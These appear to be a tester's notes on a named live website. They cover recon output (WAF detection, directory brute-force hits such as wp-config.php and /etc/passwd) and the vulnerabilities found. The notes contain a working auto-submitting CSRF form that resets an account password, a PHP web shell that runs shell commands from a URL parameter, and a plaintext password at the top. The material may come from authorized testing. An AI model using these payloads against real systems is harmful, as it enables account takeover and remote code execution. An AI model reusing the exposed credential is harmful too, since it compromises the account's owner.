
## Creds
Cybersapiens@1010
### Initial Recon
#### Web Technologies
![[Pasted image 20230808193612.png]]

```WAF
[waf-detect:litespeed] [http] [info] https://thc.cybersapiens.in/				      
[waf-detect:cloudflare] [http] [info] https://thc.cybersapiens.in/

```
#### Finding Endpoints
##### Wayback Machine Archive
![[Pasted image 20230808185708.png]]

##### ffuf
__Common.txt__
- admin
- .well-known/http-opportunistic 
- /cgi-sys/ [403]
- cpanel/controlpanel
- login/
- mailman [403]
- pipermail
- webmail 

__raft-medium-directories_long.txt__
- admin
	- /welcome.php
- login
	- /uploads
	- /testing.php
	- /etc/passwd
	- /errors.php
	- /server.php
	- /conn.php
	- /wp-config.php
	- /error_log
	- /mail
	- OAuth.php 
	- SMTP.php 
	- PHPMailer.php 
	- /process.php
	- /new-password.php

### Vulnerabilities 

#### CSRF (0 Click Account Takeover)
```html
<html>
  <body>
    <form action="https://thc.cybersapiens.in/login/changepassword.php" method="POST">
      <input type="hidden" name="email" value="JaswanthSunkara&#64;protonmail&#46;com" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="submit" value="" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
#### Arbitrary Price Manipulation and Zero-Price Purchase
![[Pasted image 20230809101807.png]]

#### Arbitrary File Upload (Shell upload)
![[Pasted image 20230809171656.png]]


```php
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC</title>
</head>
<body>

<script>
console.log("can execute arbitary JS code")
</script>

<h1>
<?php echo system($_GET['jfgrhg']) ?>
</h1>

</body>
</html>
```

#### Default/Weak admin creds
![[Pasted image 20230809174016.png]]




